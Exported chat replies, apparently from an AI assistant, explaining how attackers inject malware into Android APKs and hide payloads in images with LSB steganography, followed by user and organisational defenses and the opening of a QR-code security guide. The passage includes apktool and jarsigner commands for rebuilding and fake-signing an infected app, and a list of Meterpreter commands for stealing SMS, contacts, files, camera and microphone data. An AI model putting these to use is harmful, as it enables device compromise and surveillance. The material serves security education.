      <text:p text:style-name="P1">┌─────────────────────────────────────────────────────────────┐<text:line-break/>│ <text:s text:c="19"/>LEGITIMATE APP <text:s text:c="26"/>│<text:line-break/>│ <text:s/>┌─────────────┐ <text:s/>┌─────────────┐ <text:s/>┌─────────────────────┐ <text:s/>│<text:line-break/>│ <text:s/>│ <text:s text:c="2"/>Code <text:s text:c="5"/>│ <text:s/>│ <text:s/>Resources <text:s/>│ <text:s/>│ <text:s/>Assets Directory <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s/>│ <text:s/>(Visible) <text:s/>│ <text:s/>│ <text:s/>(Visible) <text:s/>│ <text:s/>│ <text:s text:c="20"/>│ <text:s/>│<text:line-break/>│ <text:s/>└─────────────┘ <text:s/>└─────────────┘ <text:s/>│ <text:s/>┌───────────────┐ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>│ <text:s text:c="2"/>icon.png <text:s text:c="3"/>│ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>│ ┌───────────┐ │ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>│ │ MALWARE <text:s text:c="2"/>│ │ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>│ │ ENCODED IN │ │ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>│ │ PIXELS <text:s text:c="4"/>│ │ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>│ └───────────┘ │ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>└───────────────┘ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s text:c="22"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>┌───────────────┐ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>│ background.jpg│ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>│ ┌───────────┐ │ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>│ │ MORE <text:s text:c="5"/>│ │ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>│ │ MALWARE <text:s text:c="2"/>│ │ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>│ └───────────┘ │ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>│ <text:s/>└───────────────┘ <text:s text:c="2"/>│ <text:s/>│<text:line-break/>│ <text:s text:c="35"/>└─────────────────────┘ <text:s/>│<text:line-break/>└─────────────────────────────────────────────────────────────┘</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">How steganography works:</text:span> Using the Least Significant Bit (LSB) technique, attackers modify the last bit of each pixel's color value to encode malware data. The human eye cannot detect these changes.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">The result:</text:span> When traditional antivirus scans the app, it sees only a normal app with normal image files. The malware is invisible until runtime, when a small loader extracts and executes it from the images.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Step 6: Recompilation &amp; Signing</text:h>
      <text:p text:style-name="Text_20_body">After injection, attackers rebuild the APK and sign it with a new certificate:</text:p>
      <text:p text:style-name="P1"># Rebuild the modified app<text:line-break/>apktool b modified_app/ -o infected_app.apk<text:line-break/><text:line-break/># Generate a fake signing key<text:line-break/>keytool -genkey -v -keystore fake.keystore -alias fake -keyalg RSA -keysize 2048 -validity 10000<text:line-break/><text:soft-page-break/><text:line-break/># Sign the APK<text:line-break/>jarsigner -verbose -keystore fake.keystore infected_app.apk fake</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Critical limitation:</text:span> The signature will differ from the official app. If the user already has the legitimate version installed, Android will block the installation (signature mismatch). This is why attackers target users who DON'T have the app installed yet, or they disguise it as an "update" after uninstalling.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🖼️ Part 3: The Image-Based Attack Explained Visually</text:h>
      <text:p text:style-name="Text_20_body">Since you asked specifically about images, here's how malware hides in photos:</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Normal Image Storage (Simplified)</text:h>
      <text:p text:style-name="Text_20_body">Each pixel has Red, Green, Blue values from 0-255. In binary:</text:p>
      <text:p text:style-name="P1">Pixel RGB Values: (200, 150, 100)<text:line-break/>Binary: 11001000 10010110 01100100</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">With LSB Steganography</text:h>
      <text:p text:style-name="Text_20_body">Attackers modify only the LAST bit of each color value:</text:p>
      <text:p text:style-name="P1">Original: 1100100 0 <text:s/>(200)<text:line-break/>Modified: 1100100 1 <text:s/>(201) <text:s/>- Changes by 1, invisible to eye<text:line-break/><text:line-break/>Original: 1001011 0 <text:s/>(150)<text:line-break/>Modified: 1001011 1 <text:s/>(151)<text:line-break/><text:line-break/>Original: 0110010 0 <text:s/>(100)<text:line-break/>Modified: 0110010 1 <text:s/>(101)</text:p>
      <text:p text:style-name="Text_20_body">By chaining these modified bits across thousands of pixels, attackers can encode entire malware files inside images.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">StegoPack Research Findings</text:h>
      <text:p text:style-name="Text_20_body">Testing 79 antivirus engines, researchers found that <text:span text:style-name="T1">most failed to detect malware hidden this way</text:span>—detection rates dropped to nearly zero. This is because antivirus tools focus on analyzing code, not images.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">💻 Part 4: What Happens When the Infected App Runs</text:h>
      <text:p text:style-name="Text_20_body">Once installed, here's what executes:</text:p>
      <table:table table:name="Table2" table:style-name="Table2">
        <table:table-column table:style-name="Table2.A" table:number-columns-repeated="2"/>
        <table:table-header-rows>
          <text:soft-page-break/>
          <table:table-row>
            <table:table-cell table:style-name="Table2.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Stage</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table2.B1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Action</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P5">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.B2" office:value-type="string">
            <text:p text:style-name="P5">User opens the legitimate app (it works normally)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P5">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.B2" office:value-type="string">
            <text:p text:style-name="P5">Hidden trigger code runs immediately in background</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P5">3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.B2" office:value-type="string">
            <text:p text:style-name="P5">Malware connects to attacker's command server</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table2.A2" office:value-type="string">
            <text:p text:style-name="P5">4</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.B2" office:value-type="string">
            <text:p text:style-name="P5">Attacker gains Meterpreter session with full access</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Capabilities of a Compromised Device (Meterpreter)</text:h>
      <text:p text:style-name="P1"># Once connected, the attacker can run:<text:line-break/>dump_contacts <text:s text:c="3"/># Steal all your contacts<text:line-break/>dump_sms <text:s text:c="8"/># Read your text messages<text:line-break/>webcam_snap <text:s text:c="5"/># Take pictures with your camera<text:line-break/>record_mic <text:s text:c="6"/># Record audio from your microphone<text:line-break/>geolocate <text:s text:c="7"/># Get your GPS location<text:line-break/>download /sdcard/ # Steal your files<text:line-break/>shell <text:s text:c="11"/># Full remote command access</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🚫 Part 5: How to Protect Yourself</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">For Individual Users</text:h>
      <table:table table:name="Table3" table:style-name="Table3">
        <table:table-column table:style-name="Table3.A" table:number-columns-repeated="2"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table3.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Protection</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table3.B1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">How It Works</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table3.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Only use Google Play Store</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.B2" office:value-type="string">
            <text:p text:style-name="P5">Official store has security scanning (though not perfect)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table3.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Check app permissions</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.B2" office:value-type="string">
            <text:p text:style-name="P5">If a flashlight app wants SMS access—DON'T INSTALL</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table3.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Verify app signatures</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.B2" office:value-type="string">
            <text:p text:style-name="P5">Legitimate apps from Play Store have verified signatures</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table3.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Enable Play Protect</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.B2" office:value-type="string">
            <text:p text:style-name="P5">Settings → Security → Google Play Protect → ON</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table3.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Avoid "free premium" apps</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.B2" office:value-type="string">
            <text:p text:style-name="P5">Cracked apps are common malware vectors</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table3.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Check download numbers</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.B2" office:value-type="string">
            <text:p text:style-name="P5">Popular app with 10 downloads? Suspicious.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table3.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Update Android OS</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.B2" office:value-type="string">
            <text:p text:style-name="P5">Security patches fix known vulnerabilities</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Permission Red Flags to Watch For</text:h>
      <text:p text:style-name="P1">Game asking for:<text:line-break/>❌ SMS permission<text:line-break/>❌ Contact access<text:line-break/><text:soft-page-break/>❌ Call log access<text:line-break/>❌ Location (unless navigation app)<text:line-break/>❌ Camera (unless camera app)<text:line-break/>❌ Microphone (unless communication app)<text:line-break/><text:line-break/>Calculator app asking for:<text:line-break/>❌ Internet access<text:line-break/>❌ Storage access<text:line-break/>❌ ANY permission beyond basic functions</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">For Advanced Users (Technical Detection)</text:h>
      <text:p text:style-name="P1"># Monitor network connections for suspicious outbound traffic<text:line-break/>netstat -an | grep ESTABLISHED<text:line-break/><text:line-break/># Use a firewall app to block unknown connections<text:line-break/># Check for unusual battery drain (malware running in background)<text:line-break/># Use Frida or similar to inspect running processes (advanced)</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">For Organizations</text:h>
      <table:table table:name="Table4" table:style-name="Table4">
        <table:table-column table:style-name="Table4.A" table:number-columns-repeated="2"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table4.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Measure</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table4.B1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Implementation</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Mobile Device Management (MDM)</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.B2" office:value-type="string">
            <text:p text:style-name="P5">Block sideloading, enforce app whitelisting</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Network monitoring</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.B2" office:value-type="string">
            <text:p text:style-name="P5">Detect beaconing to command servers</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">User education</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.B2" office:value-type="string">
            <text:p text:style-name="P5">Train employees not to download apps from third parties</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Application allowlisting</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.B2" office:value-type="string">
            <text:p text:style-name="P5">Only approved apps can run</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table4.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T1">Regular security audits</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.B2" office:value-type="string">
            <text:p text:style-name="P5">Test your own devices for compromises</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🔍 Part 6: Detecting if You've Been Compromised</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Warning Signs:</text:h>
      <text:list text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="T1">Battery drains faster</text:span> than usual</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="T1">Increased data usage</text:span> (malware uploading your data)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="T1">Phone runs hot</text:span> even when not in use</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="T1">Strange pop-ups</text:span> or ads appearing</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="T1">Apps you don't recognize</text:span> installed</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="T1">Settings change</text:span> without your action</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3" text:outline-level="3" text:is-list-header="true">Immediate Actions If Suspicious:</text:h>
      <text:list text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P8"><text:span text:style-name="T1">Airplane mode</text:span> - Cut network access</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:soft-page-break/><text:span text:style-name="T1">Check running services</text:span> - Settings → Developer Options → Running Services</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:span text:style-name="T1">Review app permissions</text:span> - Settings → Apps → Permission manager</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:span text:style-name="T1">Uninstall suspicious apps</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:span text:style-name="T1">Factory reset</text:span> if you can't identify the source</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P8"><text:span text:style-name="T1">Change all passwords</text:span> (from a clean device)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📚 Summary: Attack vs. Defense</text:h>
      <table:table table:name="Table5" table:style-name="Table5">
        <table:table-column table:style-name="Table5.A" table:number-columns-repeated="2"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table5.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Attacker Technique</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table5.B1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T1">Your Defense</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table5.A2" office:value-type="string">
            <text:p text:style-name="P5">APK binding (code injection)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table5.B2" office:value-type="string">
            <text:p text:style-name="P5">Only install from trusted sources</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table5.A2" office:value-type="string">
            <text:p text:style-name="P5">Permission merging</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table5.B2" office:value-type="string">
            <text:p text:style-name="P5">Review permissions before installing</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table5.A2" office:value-type="string">
            <text:p text:style-name="P5">Steganography in images</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table5.B2" office:value-type="string">
            <text:p text:style-name="P5">Advanced: network monitoring, behavioral detection</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table5.A2" office:value-type="string">
            <text:p text:style-name="P5">Fake signatures</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table5.B2" office:value-type="string">
            <text:p text:style-name="P5">Reject apps with signature mismatches</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table5.A2" office:value-type="string">
            <text:p text:style-name="P5">Dynamic class loading</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table5.B2" office:value-type="string">
            <text:p text:style-name="P5">Detect unusual network connections</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table5.A2" office:value-type="string">
            <text:p text:style-name="P5">Malware-as-a-Service tools</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table5.B2" office:value-type="string">
            <text:p text:style-name="P5">Enable Play Protect, keep system updated</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🎯 Final Takeaways</text:h>
      <text:list text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P9"><text:span text:style-name="T1">The image method is real</text:span> - Recent research (2025) shows steganographic malware successfully evades most antivirus</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P9"><text:span text:style-name="T1">Traditional antivirus misses this</text:span> - Because malware hides in images, not code, static analysis fails</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P9"><text:span text:style-name="T1">Your best defense is behavioral</text:span> - Check permissions, monitor battery/data, trust official sources</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P9"><text:span text:style-name="T1">The signature problem</text:span> - Attackers cannot perfectly clone legitimate signatures, so official app stores remain safer</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Remember:</text:span> This knowledge should be used to protect yourself and others. Understanding attacker techniques is the first step toward building better defenses.</text:p>
      <text:p text:style-name="Text_20_body">Would you like me to elaborate on any specific protection method or detection technique?</text:p>
      <text:p text:style-name="P10">\</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:soft-page-break/></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="Text_20_body">I'm unable to directly create or send PDF files. However, I can provide you with several practical alternatives to achieve what you need:</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📄 Options to Create a PDF from This Content</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Option 1: Copy to Google Docs → Export as PDF</text:h>
      <text:list text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P11">Copy my detailed response above</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11">Paste into Google Docs</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11">File → Download → PDF Document (.pdf)</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3" text:outline-level="3" text:is-list-header="true">Option 2: Use VS Code or Any Text Editor</text:h>
      <text:list text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P12">Save the content as <text:span text:style-name="T2">QR_Code_Security_Guide.md</text:span> (Markdown)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12">Use a Markdown to PDF converter:</text:p>
          <text:p text:style-name="P13"># Install pandoc (on Kali Linux)<text:line-break/>sudo apt install pandoc<text:line-break/>pandoc QR_Code_Security_Guide.md -o QR_Code_Security_Guide.pdf</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3" text:outline-level="3" text:is-list-header="true">Option 3: Browser Print to PDF</text:h>
      <text:list text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P14">Open this conversation in your browser</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14">Press <text:span text:style-name="T2">Ctrl + P</text:span> (or <text:span text:style-name="T2">Cmd + P</text:span> on Mac)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14">Select "Save as PDF" as the printer</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📚 EXPANDED QR CODE SECURITY GUIDE</text:h>
      <text:p text:style-name="Text_20_body">Since you asked for more depth, here's an <text:span text:style-name="T1">enhanced version</text:span> with additional examples, experiments, and defensive techniques:</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">📖 QR CODE SECURITY: COMPLETE GUIDE WITH PRACTICAL EXPERIMENTS</text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Table of Contents</text:h>
      <text:list text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P15"><text:a xlink:type="simple" xlink:href="#technical-deep-dive" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">Technical Deep Dive</text:a></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P15"><text:a xlink:type="simple" xlink:href="#attack-vectors-in-detail" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:soft-page-break/>Attack Vectors in Detail</text:a></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P15"><text:a xlink:type="simple" xlink:href="#practical-hands-on-experiments" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">Practical Hands-on Experiments</text:a></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P15"><text:a xlink:type="simple" xlink:href="#advanced-defensive-techniques" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">Advanced Defensive Techniques</text:a></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P15"><text:a xlink:type="simple" xlink:href="#detection--response" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">Detection &amp; Response</text:a></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P15"><text:a xlink:type="simple" xlink:href="#case-studies" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">Case Studies</text:a></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P15"><text:a xlink:type="simple" xlink:href="#tool-development" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">Tool Development</text:a></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🔧 Part 1: Technical Deep Dive</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">How QR Codes Are Structured</text:h>
      <text:p text:style-name="P1">┌─────────────────────────────────────────────┐<text:line-break/>│ <text:s/>██████████████████████████████████████████ <text:s/>│<text:line-break/>│ <text:s/>██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██ <text:s/>│<text:line-break/>│ <text:s/>██░░┌─────────────────────────────┐░░██ <text:s/>│<text:line-break/>│ <text:s/>██░░│ <text:s/>Position Markers (3) <text:s text:c="6"/>│░░██ <text:s/>│<text:line-break/>│ <text:s/>██░░│ <text:s/>Format Information <text:s text:c="9"/>│░░██ <text:s/>│<text:line-break/>│ <text:s/>██░░│ <text:s/>Data &amp; Error Correction <text:s text:c="4"/>│░░██ <text:s/>│<text:line-break/>│ <text:s/>██░░│ <text:s/>Quiet Zone <text:s text:c="17"/>│░░██ <text:s/>│<text:line-break/>│ <text:s/>██░░└─────────────────────────────┘░░██ <text:s/>│<text:line-break/>│ <text:s/>██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██ <text:s/>│<text:line-break/>│ <text:s/>██████████████████████████████████████████ <text:s/>│<text:line-break/>└─────────────────────────────────────────────┘</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Error Correction Levels</text:h>
      <table:table table:name="Table6" table:style-name="Table6">
        <table:table-column table:style-name="Table6.A" table:number-columns-repeated="3"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table6.A1" office:value-type="string">
              <text:p text:style-name="P16">Level</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table6.A1" office:value-type="string">
              <text:p text:style-name="P16">Recovery Capacity</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table6.C1" office:value-type="string">
              <text:p text:style-name="P16">Use Case</text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table6.A2" office:value-type="string">
            <text:p text:style-name="P5">L (Low)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.A2" office:value-type="string">
            <text:p text:style-name="P5">7%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.C2" office:value-type="string">
            <text:p text:style-name="P5">Industrial environments</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table6.A2" office:value-type="string">
            <text:p text:style-name="P5">M (Medium)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.A2" office:value-type="string">
            <text:p text:style-name="P5">15%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.C2" office:value-type="string">
            <text:p text:style-name="P5">Standard commercial use</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table6.A2" office:value-type="string">
            <text:p text:style-name="P5">Q (Quartile)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.A2" office:value-type="string">
            <text:p text:style-name="P5">25%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.C2" office:value-type="string">
            <text:p text:style-name="P5">Higher reliability needed</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table6.A2" office:value-type="string">
            <text:p text:style-name="P5">H (High)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.A2" office:value-type="string">
            <text:p text:style-name="P5">30%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.C2" office:value-type="string">
            <text:p text:style-name="P5">Logos, artistic codes</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T1">Security Implication:</text:span> High error correction means attackers can add malicious data without breaking functionality.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🎯 Part 2: Attack Vectors in Detail</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Attack Vector 1: QR Code Injection (QRLJacking)</text:h>
